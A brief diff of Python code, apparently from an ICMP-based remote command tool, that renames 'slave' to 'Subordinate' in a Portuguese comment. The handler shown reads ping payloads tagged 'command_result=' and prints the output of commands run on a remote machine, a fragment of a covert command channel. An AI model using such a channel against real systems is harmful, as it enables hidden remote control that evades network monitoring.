@@ -12,7 +12,7 @@ def handle_icmp(pkt):
   if 'ICMP' in pkt and 'Raw' in pkt:
     payload = pkt["Raw"].load.decode('utf-8')
     if payload.startswith('command_result=') and pkt['ICMP'].type == 8:  # Echo request
-      print(payload.replace('command_result=', '')) # exibe no console o resuldado do comando executado no slave
+      print(payload.replace('command_result=', '')) # exibe no console o resuldado do comando executado no Subordinate
 
 class InterfaceSnifferThread (threading.Thread):
    def __init__(self, interface_name):
